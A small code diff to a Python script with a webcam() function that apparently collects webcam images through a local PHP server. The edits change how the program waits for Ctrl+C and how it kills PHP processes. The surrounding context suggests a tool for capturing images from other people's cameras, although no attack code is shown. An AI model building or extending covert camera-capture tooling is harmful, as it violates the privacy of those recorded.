@@ -7,6 +7,9 @@ import json
 import sys
 import os
 
+import keyboard
+
+
 try:
     from colorama import Fore , init ;init()
     import pandas as pd
@@ -147,8 +150,9 @@ def webcam():
            Sprint(Fore.GREEN + "\r\n\nI got the images Check images folder".title() + Fore.RESET)
            
            try:
-            Sprint(Fore.YELLOW + "\r\npress ctrl + C for exit".title() + Fore.RESET)
-            sleep(9*99999999)
+            
+            Sprint(Fore.RED + "\r\n\npress ctrl + C for exit".title() + Fore.RESET)
+            keyboard.wait("ctrl + c")
            except KeyboardInterrupt:
             pass
             
@@ -158,7 +162,7 @@ def webcam():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
-        subprocess.call("sudo pkill php*" , stdout=subprocess.DEVNULL , shell=True)
+        subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
 
 if __name__ == "__main__":
